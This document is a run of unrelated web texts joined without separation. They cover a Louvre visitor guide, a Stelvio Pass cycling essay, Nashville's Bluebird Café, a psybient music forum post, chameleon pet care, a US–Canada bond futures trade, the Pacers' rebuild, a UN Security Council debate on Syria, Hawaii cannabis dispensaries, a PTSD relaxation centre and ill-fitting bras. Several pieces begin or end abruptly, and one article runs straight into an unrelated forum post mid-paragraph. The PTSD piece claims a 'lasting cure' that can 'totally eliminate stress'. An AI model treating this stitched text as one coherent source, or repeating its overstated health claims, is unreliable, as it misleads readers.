Originally the structure was built as a fortress in the 12th century. Since then, it has had a history of never ending remodeling to meet the needs of various purposes with its latest addition in 2012. It was once a home to Francois I and later to Louis XIV, which he found to be too busy so he built Versailles just outside of town as a retreat or place to get away. The palace was established as a museum in 1793.
Top 5 Experiences in no particular order…
The Islamic Galleries “Flying Carpet” – This beautiful addition was complete in September of 2012. Located in an internal courtyard, the roof or flying carpet, does not touch the original facade of the Louvre. It is a beautiful marriage of traditional architecture of the Louvre, and valuing progress with a modern structure. The exhibit space is submerged 40 feet into the ground to provide light sensitive objects a safe viewing space. I am not sure how much time I spent looking at the structure. It was truly stunning.
2. Winged Victory of Samothrace – As I have shared before, sculpture is not a strong suit for me, but the first time I saw the Winged Victory, I gasped. She is perfectly displayed in the museum and I can only imagine what she originally looked like over 2,ooo years ago proclaiming victory of a sea battle and honoring the goddess Nike. Make sure you view her up close and far away, taking her in from as many angles as possible. It is a mystery to me how artists can make stone look like delicate, transparent material flowing in the wind!
3. Mona Lisa and Wedding at Cana (Denon wing, 1st floor, Room 6) – One of the most popular rooms in the Louvre is 17B which houses the Mona Lisa by Leonardo da Vinci. I cannot imagine there not being a giant crowd around her. Just be patient and you will be able to make it up to the front to see her and snap a picture. In order to preserve the painting, it is behind glass and the crowd is kept quite a few feet away. Honestly, I was shocked by the small size of this famous painting. I am glad I saw it, but the painting that drew me in was The Wedding at Cana by Paolo Veronese displayed on the opposite wall. It is HUGE! There are so many details, you can gaze at the painting for hours!
4. Caravaggio – I had to include the Caravaggio paintings, well you know, because he is David's favorite painter. The Louvre has three paintings, which is amazing considering there are approximately 50 in the world. So when we arrived at the museum, we had to high tail it to these paintings first. The paintings are The Death of the Virgin, The Fortune Teller, and Portrait of Alof de Wignacourt. The piece that stood out most to me was The Death of a Virgin. The depth and darkness characterized by Caravaggio was exemplified in this painting as well as the way he liked to push the envelope. This painting was originally rejected because it showed the virgin's ankles. Scandal!
5. French Nationalistic Paintings – You must visit the French nationalistic paintings! Some highlights are the Coronation of Napoleon and The Intervention of the Sabine Women by Jaques Louis David and Raft of the Medusa by Géricault. They are huge! They are grand! They are gorgeous! While looking for these paintings, you will see other outstanding paintings as well in this area.
Once again, there are so many great pieces of work in this gigantic art museum. While the above list represents our favorite experiences, this is just the beginning. Other notable pieces recommended by friends are Venus de Milo, Cupid and Psyche by Canova and Ingres' Odalisque.
Purchase tickets for 15 Euros or bypass the ticket line with a Paris Pass or Paris Museum Pass. The Louvre is open everyday from 9am-6pm and closed Tuesdays. The Louvre stays open late on Wednesdays and Fridays, closing at 9:45pm. Check their website before you visit because some days there are exceptions and hours could change seasonally. There are even some days the admission fees are waived!

As far as famous climbs go, there are few, if any, that can claim spots higher in the pantheon of legendary climbs than the Passo dello Stelvio. It is synonymous with all that is great about the mountains in most people's minds…and when it comes to switchbacks, there's nothing quite as magical as the 48 numbered tornante heading up the climb's northern face.
I remember vividly the first time I saw an image of the Stelvio. It was 2002, I had only just begun riding bikes, but I had already been infected with the virus that still accompanies me today – an obsession with finding new roads, new climbs, new places. It didn't take long before I stumbled upon a small journal post about the famed pass, and it was only minutes later that I saw the northern side of the pass with its upper switchbacks golden in the late day sun.
It stuck with me. It would be many years before I'd have the chance to see it and feel the road and the mountains for myself, but it was always a special memory.
When I finally saw the north side this May at the end of the Giro, I was exhausted and sick. This May's Corsa Rosa was our first ever full Grand Tour, so by the time we made it to the penultimate day pass-top finish on the Stelvio, we were spent. There was little that was turning my head in awe at that point, save for a pillow. After De Gendt's rampage and Hesjedal's excellent defense against Rodriguez's attacks, I walked over to see the still snow-covered, still closed northern side, and it brought me to a halt. I'm nowhere near a point where I've seen even a fraction of what I hope to see in my life, but still, I think it's safe to say that I've seen a lot of climbs, a lot of views, a lot of everything when it comes to roads, but the first time I laid eyes on the mountain face bathed in switchbacks, it was beautiful, special. Same with the second time. I don't know exactly what it is about that view, but it's like very few others. The feeling is akin to the first time I rounded the bend to the final pitch to the chapel atop the Muur van Geraardsbergen. There are a few scenes that lovers of the bike should see, and the Stelvio is high, high on my list.
There are three approaches to the pass – from Bormio (my least favorite), from Switzerland, and the ultra-famous northern approach, which begins in Prato and has 48 numbered switchbacks over the course of its 25 kilometers of ascent. At the top, you'll be pedaling through thin air for Europe. With an altitude of 2757 meters, it's the second highest paved pass in Europe (behind only the Iseran in France) and the fifth highest paved road.
The idea for a road linking the Valtellina with Tirol is quite old, reaching back to Napoleon himself. It wasn't until 1818 that the gears began to turn when soon to be famous road engineer Carlo Donegani began surveying the project. Work began in 1820 and was completed five years later with the help of 2,500 workers. Donegani was the rightful recipient of numerous accolades including the title of Count of the Stelvio. His vision, nearly 200 years old now, has stood the test of time. The road up and over the pass is not just a utilitarian path – it's just plain gorgeous. I'll halt there and direct you to a true writer's account of the history and all that is great about the Stelvio – an excerpt from Daniel Friebe's book, Mountain High .
While the Giro is fond of the Stelvio, its excessive altitude puts some limits on inclusion into the race. The Stelvio has featured in the Giro d'Italia ten times, beginning in 1953, and most recently this past year. The Stelvio will once again play a major role in deciding the Giro d'Italia's winner in 2013. It will be the middle climb in a monstrously difficult stage that will feature three climbs in just over 70 miles of racing: the Gavia, Stelvio, and Val Martello.
This fall, my wife Ashley (in the photos) and I had a plan: we wanted to shoot the Gavia and Stelvio just before the winter hit. I wanted that light, the color, the feel of fall. We planned to get to Bormio by Saturday, but were sidetracked by the Red Hook Crit in Milano, which was on Sunday. The weather was perfect. We had been watching the webcam for weeks, and on that Sunday, the scenes we saw playing out before us on that dodgy webcam were enough to take screenshots of. By the time we got to the pass on Monday though, the region was in the midst of the season's first snowstorm. It snowed from Sunday night, all the way through the next evening. The Gavia was closed. It's always the first to go, so that part of the plan was scrapped, leaving the Stelvio…which only rarely closes, which can only be for one reason: there's a ski area at the top.
We had to make do with the best we could on the first day, shooting in a blizzard, laughing at our snow clogged cassettes, our lonely tracks in the snow, and the fact that an entire mountain was ours, and ours only. It made for some entertaining pictures and a way to get our minds off the fact that we had missed perfection by one day.
Two days later, we ventured to the top and instead of bike riders, there were joyful early season skiers relishing the fruits of the bountiful harvest of the storm. We had given up hope of shooting the north side, but the road was clearing quickly in the bright, warm fall sun. We rode down and laughed at how different the road that was choked with cars only a little while before was under the blanket of winter. As we headed home, we saw the plows working their magic from far below – tomorrow would be our chance to play on a clear road.
And so it was. In an amusing intersection between typically summer and winter activities, cross country skiers shuffled by along groomed paths, while we pedaled only a couple meters away from them in long-sleeve jerseys and knee warmers. It was warm.
The climb itself is fair and true. It's no monster like the Zoncolan or Crostis. It's a fairly constant 6-9%, designed for transit, and not an after-thought like some of the famously paved farm roads of the area are – say the Mortirolo, for instance.
So the suffering does not come from lack of gearing, but its never-ending nature and the toll that the altitude begins to take on the lungs. When you see the sign Cima (summit) Coppi 48 hairpins later, which is the name that the Giro gives its highest pass each year, you'll have reached the top. I'll spare you the self-indulgent details of making our way to the top. The only way to experience a mountain like this is to ride it yourself, as fast or as slow as you wish.
If you're ever fortunate enough to have the opporutnity, riding the Stelvio Pass is like no other climb you'll ever experience. It's perhaps the greatest climbs in Europe, and riding it in early winter was a sight that's etched in our memories forever.

If you're not familiar with Nashville the city, you might assume that The Bluebird Café — which appears on Nashville the show — is just a fake place where fake country singers perform fantastically real love songs like “No One Will Ever Love You.” But allow us to enlighten you: The Bluebird Café exists in real life! And it's a legit venue. Garth Brooks was discovered there in 1987; Taylor Swift performed on its stage — and met future Big Machine founder Scott Borchetta — there in 2004. Now that the Bluebird (or an exact replica of it, at least) is also the star of a television series, has it seen even more success? Vulture called up COO Erika Wollam Nichols to find out the effect Connie Britton has on the Café's business.
Some background here: There's a no-talking policy at The Bluebird Café (at least when artists are performing). And so patrons — very serious music fans — are known for shushing talkers. Since Nashville started, there has been a small spike in inappropriate audience chatter. Shut up, guys. This isn't a dive bar.
I just found this out. I like to read a few posts of psybient.org while I collect the music most close to my heart. I really have a few things to speak out... if I may say so.
Democracy is a great tool, but I am not sure it really speaks about quality, votes are more like quantity. What is popular currently does not always last. Books are this way, music is the same... If you check out billboard top100 from 60's, 70's, most of the top 10s nobody knows now... and of course it is impossible to say who can make the final judge, maybe only time, and sometimes even time is not enough, you need to wait eons of time...
anyway, personally, I think the top 1 should be VA - Sacral Fractal 2014 Gliese 581C Records. it is actually a free album and the music selection is really great. I don't think a lot of VA are really compiled, they are mostly just put together. I knew a lot of soundcloud DJs are compilers. You see, you need to keep the energy flow somwhat consistent and each piece has to be good enough quality. It is a very challenging task within one music label.
The other two Va compilations I like, one is VA - Psychotria Chill Selection 2014 Psychotria Records Hungary. The music quality is a bit uneven, but the good ones are exceptionally good.
The other is VA - Paz 2 2014 Ovnimoom Records... Its music is not as fresh as psychotria, some of the music are already in Ep and other albums, but the whole album is very nicely compiled....
I heard people talk about money in the discussion of the best albums and I want to say a little bit too.. People when they have certain experience, I mean become an adult, they like to choose pessimistic tone to talk about sensitive issues.. And I don't really think it is necessary..
Psychill, psybient music is so promising and has so much hope, there is nothing to worry about purchase one or two albums at all... the more you think about it, the less your future of being bought... I would say pop music has a lot more to worry about that, and aren't they so much more sensitive of that subject than anyone else?!
Psybient is music to open your mind and your heart, and if your music has such power, how could you ever need to worry about not to support yourself?! I can not purchase any of the music on bandcamp or beatport, but I spent all my spare money to buy MicroSD cards. So I will always be able to carry my beloved psybient music collection with me... Maybe Toshiba, Sandisk and TDK would sponsor psybient.org! And I will do my best to support the musicians I respect... Money, is a good tool, but it is not a Lord some people tend to regard... thank you for reading!

Do Chameleons Make Good Pets?
Facts You Should Know
Yes, chameleons make good pets, BUT a word of caution:
Chameleons are difficult to maintain, and new reptile owners should NOT start with this animal.
The word, “Chameleon,” comes from the Greek words, “chamai” and “leon,” meaning “earth lion,” and they originate from the lizard family. Chameleons come in all shapes and sizes, with considerable variation. Their lengths can range from a mere one inch (2.5 cm) to 30 inches (76 cm) long.
Chameleons have become popular as exotic pets because of their unique color-changing capability. The purpose of this color change is for communication, and to regulate body temperature.
Some baby chameleons are gray or brown in color. Others, like the most commonly Veiled Chameleon, can be purple at hatching and then quickly turn green.
Chameleons have the ability to change colors the same day they hatch. (They may even be capable of doing so while still in the egg.) The color spectrum ranges with variations of green, black, turquoise and blue-green.
Amazon Books on Chameleons:
Panther Chameleons, Veiled Chameleons, and Jackson's Chameleons
Some colors reveal their emotional levels, such as stress, sense of temperature change, excitement and to communicate with other chameleons. Brighter colors exhibit good mood, while darker colors such as black, gray and brown depict stress.
Chameleons have a very long tongue and can stretch their tongue up to one and a half the length of their body.

How do Chameleons Change Color? Their Secrets Revealed
They have five toes on each foot, with three of them facing forward, and 2 facing away from mid-line, helping them get a firm grip while climbing trees and branches. In the wild, chameleons spend most of their lives in treetops. Some chameleons have prehensile tails which also help them get a good grip and help with balance.
Chameleons have the ability to rotate their eyes in two different directions, and both eyes are independent of each other. They can rotate their eyes to get a panoramic view.
Chameleons are insectivores. In captivity, they eat crickets, dubias, silkworms, hornworms, flies, and more. A few species also supplement their diet with fruits and leaves, but it is a very small percentage of the diet. In the wild, a large chameleon would even eat small birds and other lizards.
Do Chameleons Make Good Pets?
It's easy to see why people find chameleons fascinating and want to keep them as pets. A word of caution, though. Chameleons are very difficult to maintain and inexperienced reptile owners should not start with this reptile. Having said that, they are also not the most difficult exotic pet to take care of.
Chameleons don't cuddle. If you're looking for a cuddly pet or one that likes to be held, then look elsewhere.
RELATED:
10 Things About Chameleons You Never Knew
Wild reptiles are more than likely to be infected with parasites. Buy a chameleon from a respected breeder if you do insist on getting one. Avoid the big chain stores.
While selecting the pet chameleon, it is important to determine the health of the animal. The chameleon should be active and look healthy, with bright coloration.
Panther Chameleons, Veiled Chameleons, and Jackson's Chameleons are the most widespread species that kept as pets. Chameleons are solitary animals and they shouldn't be kept with other pets. It is a very bad idea to keep two male chameleons together as they will fight and injure each other. They should be put in a cage with a lot of foliage to climb and to provide privacy.
In a nutshell, chameleons make good pets, but please don't be in a rush to get one before you thoroughly research their care requirements. They come with a price, meaning their initial equipment is pricey, and their ongoing care can be as well. They need housing, lighting, heating, specific water needs, food, vet visits. Talk to experienced reptile owners before you decide.

An unusual trade across America's northern border is starting to become a more prominent fixture in the market for sovereign debt.
It's a straightforward play: simultaneously purchase Ultra 10-year Treasury futures and sell contracts for similar-maturity Canadian debt. It's a bet that U.S. bonds will outperform as the Federal Reserve slows down its pace of interest-rate increases, while the Bank of Canada appears to be considering a hike as soon as next month.
What's striking to traders is the size of the wagers. Each leg of Wednesday's transaction, which sent Canadian bond futures tumbling, represented about $820,000 of risk per basis point. Toronto-based traders at two Canadian banks said they believed the 9,098-contract Canadian block to be the second-largest ever; they asked not to be identified because they're not authorized to speak publicly.
Targeting the yield spread between U.S. and Canadian debt, which reached the narrowest since October, isn't as common as trading the difference between Treasuries and bunds. German securities serve as a proxy for the euro area and react to European Central Bank policy decisions. The emergence of these cross-border flows may signal that traders are trying to get ahead of a global effort to tighten monetary policy after years of unprecedented stimulus.
Investors on Wednesday ramped up bets on a rate increase in Canada after BOC Governor Stephen Poloz said “rates are of course extraordinarily low,” and after rate cuts in 2015, the central bank needs to consider pulling back on stimulus efforts. The market-implied probability of a hike next month is about 68 per cent, according to overnight indexed swap data compiled by Bloomberg.
Those remarks sent 10-year Canadian yields higher by seven basis points, to 1.64 per cent, making them among the worst performers among developed-market sovereign debt. That cut the spread with Treasuries to as little as 58 basis points, the lowest since Oct. 19.
Last week saw the same U.S.-Canada trade, with equally weighted futures blocks also with a September expiration, though for about half the duration risk as Wednesday's transaction. That means the total position stands to gain or lose $1.3 million per basis-point move.

Buy Photo Larry Bird has revamped the Pacers roster on the fly. (Photo: Robert Scheer / IndyStar)Buy Photo
The job is complete. Now we await the results of Larry Bird's rebuild of the Indiana Pacers from a big and slow yesterday to a sleeker, faster tomorrow.
After the addition of backup point guard Aaron Brooks on Monday, Bird has turned over 92.3 percent of the roster in three years. The Pacers president has taken apart a team that reached back-to-back Eastern Conference finals in 2013 and '14 – a team whose best days were glorious, entertaining and behind it – and put it back together.
Just one Pacer remains from the roster that opened the 2013-14 season, and that player – Paul George – suffered a broken leg that cost him all but six games of the 2014-15 season.
And the Pacers kept winning.
Did they win big? No, point of fact, they did not. But teams that go through this kind of overhaul don't win big. They don't win at all. Starting in 2013, the Lakers – as they prepare for life after Kobe Bryant – have seen their victory total dip from 45 to 27 to 21 to 17 this past season. Kobe missed 76 games in 2013-14, the year the Lakers won 27 games.
The Cavaliers bottomed out after losing LeBron James in 2010, winning 64 games – total – in the three years after that. They bounced back and won the NBA title this year, thanks to LeBron's decision to return home, but that's what it takes these days to make a sudden turnaround in the NBA: for one of the greatest players of all time to show up on the doorstep.
The Celtics after rebuilding from the era of Paul Pierce, Kevin Garnett and Ray Allen? They went 25-57 in 2013-14. They're on the way up behind Danny Ainge and Brad Stevens, but still ... The Celtics were 27th in the NBA just three years ago.
Same for the Knicks. On the way up as Phil Jackson has dismantled the cast around Carmelo Anthony. But only after going 17-65 two years ago. The Knicks won 32 games this past season, six wins fewer than the Pacers in their worst season – their only playoffs-less season – since Bird brought out the wrecking ball. And that awful season for the Pacers, unacceptable around these parts, saw the team win 38 games and not fall out of the playoffs until the last night of the regular season.
And that was the year Paul George missed 76 games with the broken leg.
This sort of stuff doesn't happen, but it's happening here. For just a minute let's stop hammering Bird on the head for drafting Tyler Hansbrough over Jeff Teague in 2009, and for acquiring Evan Turner and Andrew Bynum in 2014, and for drafting All-NBA forward Kawhi Leonard in 2011 – only to trade him to the Spurs for George Hill.
Mistakes? He's made a few. But listen, Bird's rebuild of the Pacers has been shocking for its speed. The team has to go out this season and win and win big, but on paper – which is all we have at the moment – the Pacers look like one of a handful of teams in the Eastern Conference who could finish second to the Cavaliers. Toronto and Boston are the other top candidates for that spot in a conference that is getting better. Detroit, Atlanta and the Knicks are coming along nicely.
It starts here with Paul George, of course, who is coming off the best season of his career in 2015-16. And he played his best in the playoffs, putting on his cape and carrying the seventh-seeded Pacers to a Game 7 against the No. 2-seeded Raptors.
But around George, Bird has dismantled the Pacers like Mr. Potato Head and put them back together in a way that looks to have improved every position. This offseason alone, the Pacers look better in the frontcourt – Myles Turner, Thaddeus Young and Al Jefferson over last season's rotation of Ian Mahinmi, Turner and Lavoy Allen – and at point guard. Bird acquired Jeff Teague in a three-team trade that saw the Utah Jazz get George Hill and the Atlanta Hawks wind up with the No. 12 pick, who became Taurean Prince of Baylor.

There are variables, shooting guard Monta Ellis' knees being the most pressing. The health of Rodney Stuckey and C.J. Miles is also a question mark. Al Jefferson played just 47 games last season. The defense probably has taken a step back. This team is not bullet-proof. Nobody's saying that.
But this team is better than it was a year ago. Better than it was two years ago. Completely different than it was three years ago – new roster, new style, even a new coach. Nate McMillan replaces Frank Vogel, whose dismissal in May makes less sense than ever. Bird said he wanted a “new voice” in the locker room, noting that coaches can grow stale after three years. Only one player, Paul George, has been here three years.
But that sounds like a complaint, and today isn't the day to complain about Bird. Today's a day to acknowledge what he has done, and how furiously fast he has done it. Now we wait for the results. It calls for the one thing Bird hasn't shown: patience.

New York (CNN) The US missile strikes in Syria Thursday night exploded just as the UN Security Council in New York concluded a closed-door debate on Syria so heated one council diplomat said "there was blood on the floor."
The Security Council -- the group of 15 countries charged with protecting international peace and security -- has seen only failures in Syria during the six years of war. Russia, backed by China, has vetoed seven different resolutions.
The years of frustration plus the new presence of US Ambassador to the United Nations Nikki Haley, with a more aggressive approach, contributed to a more heated discussion Thursday night.
The evening before at the Women in the World Summit in Manhattan, Haley smiled and said, "We don't do soft power." The UN meeting just two days after the chemical attack was to determine if there could be an international resolution to condemn the Syria gas attack and potentially state demands for Syria to comply with an international investigation.
The exchanges between the US and Russia behind closed doors were particularly tense. One council diplomat described the whole atmosphere as "exceptionally poisonous."
As Thursday night's debate began, the rising tensions in and outside of the Council chamber reminded observers of the run-up to the two US-led invasions of Iraq, along with other US quick strikes such as inside Libya in 2011. Those events seemed were preceded by days or weeks of debate and drama at the UN.
By comparison, events late last week at the UN happened at warp speed. Soon after the nations sat down in the private consultations room, Haley announced there would not be a vote on a resolution. A British diplomat tweeted that news leaving media and other diplomats not in the room perplexed. All day, the US had talked openly about the need for a vote to send a message to Syrian President Bashar al-Assad. That would be the first tip that the US delegation knew a military option, not diplomacy, had been chosen by the Trump administration. Diplomats speculated that Haley would have liked to have gotten a Russian veto to provide political cover for a missile launch. Not that the Trump administration felt it needed any action from the UN, an organization the US President disdains.
But something unexpected happened inside the room. There were now three different proposed resolutions that would respond to the chemical weapons attack. The US draft would demand more compliance from the Syrians and the Russians were more supportive of the Assad regime.
A third resolution, intended as a compromise of sorts, was submitted by Sweden and nine other non-permanent members of the council that usually let the big permanent nations flex their muscles. Haley was peeved that countries usually supportive of the US were coming up with their own resolution on Syria. That would hamper efforts to highlight Russia's intransigence.
In explaining the decision to not go to a vote, a US official said Monday looking back, "it just got complicated. When it went from one to three texts it made things more difficult."
A Security Council diplomat said Haley was quickly dismissive of the new third draft by these member countries who don't have veto power on the Security Council. The diplomat said Haley's body language indicated she wasn't pleased. And Haley remarked, "then there is this Swedish thing!"
The diplomat said its extremely rare to get countries from such widely different political spectrums as Ukraine and Bolivia to come together on a proposed resolution to counter the big powers who weren't happy that these two-year Council members were now pushing their own Syrian ideas. A council diplomat said the non-permanent members during the meeting said in effect, don't take us for granted.
But Haley, serving as council president for the month, was in charge. And if the US didn't want a vote, Russia didn't either. Moscow, well aware it would not get the required nine votes for even putting its draft, more supportive of Assad, to a formal vote.
There are "bruised feelings', said one council diplomat that have to hear first before further action. The US official said the "process isn't dead yet."
After about two hours of sharp talk Thursday night, the ambassadors filed out of the room. As to why it ended at that exact moment, one UN diplomat said everybody had their say and it was finished. But the timing was hard to ignore. The Deputy Russian Ambassador Vladimir Safronkov was surrounded by UN journalists and asked what the impact would be if the US staged a military attack. He said there would be "negative consequences."
Minutes before he issued his warning, the US missiles had just made their impact at the Syrian base suspected of delivering the deadly gas attack.

Cannabis—known locally as pakalolo—has a long history in Hawaii, both before and after criminalization at the federal level. As Lawrence Downes, a New York Times journalist from Hawaii, explained in an editorial for the paper in 2012:
Hawaii in the late '70s was a land of artisanal home growers and farmers producing legendary strains like Maui Wowee and Puna Butter. Rolling Stone in 1979 called pakalolo Hawaii's No. 1 crop, above sugar and pineapple. Its sickly sweet haze hung heavily over concerts and beaches, and there was a remarkable tolerance in the air, too.
Medical cannabis was legalized here rather early, in 2000, but Aloha Green and other dispensaries only secured licenses in the past year or so. It took that long for the state to authorize dispensaries.
Aloha Green is one of eight such dispensaries in the state, and one of three on Oahu, the island that's home to the bulk of the state's population. About 5,000 patients participate in Oahu's medical-marijuana program, the only way to gain access to the dispensaries and their goods.
After the licensing, it took nearly a year for Aloha Green to actually open for business. In the interim, they were growing their own product—another requirement. Dispensaries can't buy their pot from one another or other sources.
In a recent editorial, Chris Garth, the head of the Hawaii Dispensary Alliance, argued that this so-called vertical-integration mandate drives up prices and has limited cultivation on the island to just a few strains. If marijuana is considered medicine, this would be like going to a drugstore and finding just Vicks VapoRub and Pepto-Bismol on offer, he argued.
In an interview, Garth explained that he understands the public-safety reasons for controlling the plants from seeds to sale. Still, “the vertically oriented market is incredibly cumbersome when it comes to the costs of production,” he said.
These regulations make the pot at Hawaii's dispensaries more expensive than it is in places where marijuana flows freely and recreationally, like Colorado or Washington State. (Customers can pay with cash or with CanPay, an app designed for cannabis retailers. Aloha Green doesn't take regular credit cards.)
Cho, who doesn't use cannabis herself, seemed drawn to the cannabis industry by these challenges. She worked in start-ups in New York before moving here—apparently the only thing as tough as venture capital in the big city is operating a marijuana store in paradise.
Dispensaries here are regulated by the health department. Cho speculated, nicely, that their bureaucratic overseers might be, well, a little square. “They all have very good intentions, but because they are upright citizens who've not done bad things, they don't really know about cannabis culture and the way that it works,” she said. “Understandably, they haven't ventured into it, because they are good citizens who don't break the law.”

I received an email this week regarding the efforts of a Gulf war veteran on behalf of veterans suffering with Post Traumatic Stress Disorder (PTSD), which is characterized by potentially disabling symptoms, that are behavioral and emotional and occur in those individuals exposed to severe psychological trauma such as sexual abuse, combat, or natural disorders. In 1980, PTSD became officially recognize by the American Psychiatric Association, and added to the third edition of its Diagnostic and Statistical Manual of Mental Disorders (DSM-III).
PTSD is a relatively new diagnosis, but it has been with mankind since the first cavemen began beating each other on the head with clubs. All one has to do is watch any documentary of a tragic event and observe the reaction of those who have lived through it. They can hardly get three words in edge-wise before there is a breakdown of emotion. In the movie, “Band of Brothers”, the personal interviews with the heroes who fought in Easy Company, were obviously very stressful for those who survived, and you could see in their demeanor the long-hidden PTSD each man had carried the last six decades. That is PTSD.
A couple of months ago I wrote about PTSD and the problems it has caused for the veterans who live every day with their own demons, fears, and flash backs, and why the transition from warrior to civilian is so difficult. There is no doubt that since 1980, when APA officially recognized PTSD as a mental disorder, the military and Veterans Administration have been doing a much better job of helping those who display the most obvious outwardly signs, but there have been millions of others who have slipped through the cracks because, in most part, the fear of being “labeled” or “tagged” with a “mental disorder”. So many who served in WWII, the Korean War and in Vietnam, have never gotten the help they need, and live every day with the possibility of having a complete breakdown. Most are not even aware of their condition, and seek solace by never allowing themselves to re-visit the event(s) which can trigger less than normal behavior.
Today the VA and military have gone to great lengths to help those who are returning from the multiple missions they have been assigned in combat zones, well before major problems can occur. As it has been explained to me, there are a number of decompressing steps that need to be taken:
Returning from Warrior mentality to normal military duty Re-establishing communication and intimacy with family and friends Counseling to understand and recognize how to deal with the potential effects of PTSD Reintegrating into the civilian environment Making the decision to re-enlist or transition to civilian status Preparing for civilian life and employment if civilian transition is the choice Regaining normalcy in “the real world”.
Each branch of the service provides a number of mandatory counseling and informational programs as well as an array of training programs that can help deal with the ever-present possibility that some will never achieve 100% normalcy because with war “you never get over it but you learn to live with it. It's part of who you are but you don't dwell on it. If you dwelled on it you'd be paralyzed by it”. (Greg Marinovich, war correspondent).
In addition to the “unwinding therapy” provided by the military and follow-up by the VA, many counseling support choices are available through the non-profit sector, including faith-based groups, ex-military support agencies, state sponsored solutions, and individual groups of PTSD victims learning to cope by helping others facing the same battle. I have mentioned several such groups in past articles, but this last week I was introduced to Antoine Johnson M.A. ED. SPEC., President of the Warrior Relaxation Response Center in Colorado Springs CO, who after serving a couple of combat tours and retiring from the army, transitioned to civilian life to pursue a teaching career.
Since leaving the military Antoine knew his role in life was to help those in need. It started in the Colorado Springs School District where he learned how to educated troubled students who were on the verge of giving up on life. As Antoine puts it, “This was my basic training for what I do today… working with the hardest kids society can offer up”. His first months of work after leaving the army as a combat platoon sergeant, were the most difficult part of his transition to civilian life, and was made even harder by having to educate kids who just couldn't care less, compared to directing troops, where duties were carried out without much hesitancy. This is not to complain, but having to become mentor, hero, father, and friend to help his students gain respect for themselves and for life, became essential for his role at the Warrior Relaxation Response Center.
After a brief tenure in his teaching profession, Mr. Johnson read about his fellow warriors who were undergoing the same transitioning challenges he had faced with many never quite reaching a point of fully understanding their affliction with PTSD. He knew he must be there to help as many as possible achieve the level of metal freedom that can only come about with the right kind of help. The need to serve, as it was to volunteer to serve his country, again became a calling greater than the need for personal success as a teacher, and as satisfying as it was in his position to help wayward bound children get back in step with society, he knew he had to answer this new call.
So began Antoine's one-man campaign in May of 2009, to develop a facility where ex-soldiers could come for help to identify and understand the serious emotional and behavior disorders he himself had to deal with. There were no start-up grants to fund Mr. Johnson's program, no major donors, only a goal to develop a program he himself had followed and one which offers a lasting cure to PTSD.
Modeled after the therapy concepts of Harvard cardiologist, Dr. Herbert Benson, Antoine created the Warrior Relaxation Response Center using multiple discipline concepts to overcome the many symptoms of PTSD so that life can become a center of normalcy. This was not simply a class-room type instructional program, but a program to “deprogram the hard-wired” antidote of fight or flight reaction in response to stressful situations that were the key elements of survival in combat.
The concept of relaxation as being the key to overcoming a learned stress reaction like fight or flight requires many elements that must be re-learned. To those with no experience in the field that may seem pretty simple, but in fact is one of the most difficult mental tasks that one must accomplish. Because post traumatic stress disorder creates both physical and mental responses dealing with the anatomical and physiological functions for the entire body (structure of all living things) all the way down the cellular/genetic level, the entire being needs to be addressed which is impossible without total relaxation.
The Relaxation Response Center teaches decreasing metabolism, heart rate, blood pressure, and the rate of breathing, to calm brain activity much in line with meditation techniques used in other therapy procedures. The purpose of the program is to automatically elicit or bring-out a response in participants that will bring peace and calm, which have been shown to elicit changes in gene activity, and can totally eliminate stress. Like the initially learned response to combat was the fight or flight phenomenon, caused by an increase in adrenaline, the object to relaxation therapy, is to train the body to basically redirect attention and decision-making functions of the brain, so it can respond rationally to the degree of stress that needs to be addressed.
The program developed by Mr. Johnson is not a “cheap, one-night stand”, but rather a complete re-learning process with an outstanding record of success. It does take time to un-learn and then re-learn behavioral patterns, but for a soldier wanting to put the past behind, it is well-worth the effort and time.
The road to satisfying the criteria for TRI-CARE coverage has been one of the major hurdles to leap, but with the addition of two part-time licensed behavioral specialists Antoine's center now meets the requirements for coverage, and the center joined its network on July 1. It means Fort Carson health providers now can refer soldiers to the center for behavioral health treatment, and an opportunity for continuing this remarkable program.

Is your BRA making you ill? Headaches, IBS, rashes, hernia and tendonitis are all linked to badly-fitting underwear
Estimated that up to 80% of women wear a bra that doesn't fit them properly
An ill-fitting bra can trigger seemingly unrelated conditions because it can irritate skin and affect posture - which in turn affects internal organs
Shirley Brailey, 62, suffered a hiatus hernia and heartburn because she wore a poorly-fitted, underwired bra
A well-fitted bra can prevent breast-reduction surgery, say doctors
Health experts are warning about the the serious health problems that can be triggered by wearing an ill-fitting bra.
They say that seemingly unrelated conditions including skin rashes, tendonitis and even indigestion can be caused by poorly fitting undergarments, especially if you have large breasts.
It is thought that four in five women wear an ill-fitting bra because they tend to underestimate the width of their back, while overestimating their cup size.
Ill-fitting bras can trigger a wide range of conditions - from indigestion to tendonitis - because the underwear affects posture and the positioning of internal organs
Lorna Mills, a chiropractor practising in Oldham, said: ‘Women come into my clinic on a regular basis showing rounded shoulders, curves in the back, indigestion due to the diaphragm and lungs being restricted, marks from straps and underwires, dents in the shoulders: all the signs of an ill-fitting bra. '
She says that one of the biggest problems is that women are regularly fitted with bras that are far too big in the cup.
'This then means the straps are too big so they are continually tightened, which then pulls the shoulders and neck down, curving the spine and creating tension and discomfort.
Retired school teacher Shirley Brailey suffered a hiatus hernia because of an underwired bra
'The underwire can creep up because of straps that are too tight and pressure builds around the stomach and lower oesophagus. Tissues that end up being pushed and pulled in unnatural directions.'
One woman who has suffered the effects of an ill-fitting bra is Shirley Brailey.
Shirley, a 62-year-old retired teacher from North London, said her hiatus hernia, IBS and indigestion were all caused by wearing an ineffective underwired bra.
‘For years. I have suffered from a range of complaints which, after speaking to specialists, I now realise are largely a consequence of wearing bras that never properly supported me.
‘I have suffered from hiatus hernia, heartburn, IBS and indigestion that I can pinpoint as starting when I first started wearing underwired bras.
'I have indents from the straps that have even affected how my clavicle bone ‘sticks up'.'
Shirley was also told that her back had been flattened by her bra because the muscles down the front of her body and legs had shortened as her chest pulled her forward.
Shirley, who practised pilates and T'ai Chi to in a bid to remedy her problems, also suffered from tension headaches and neck pain, tendonitis in her shoulders and elbows and pins and needles.
Richard Moore, a consultant osteopath and sports massage therapist in Nottingham, said: ‘On many occasions I have been able to link women's back and neck complaints directly to badly-fitted bras that not only offer limited or no support but creating visible problems in posture, resulting in pain and tension.
Bras can affect posture, which often leads to back pain and even indigestion. Straps that are too tight can also trap nerves and cause headaches
‘Traditional bras are often too tight around the ribs, creating a pivot point in the middle of the back, dividing it into two smaller areas that can't work as effectively.
‘The lack of support at the front can also bring the upper back forward and to compensate for this, many women end up tilting their heads backwards.
HOW TO PICK THE PERFECT BRA
STRAPS Should not dig in but fit comfortably next to the body with no bulging on either side .
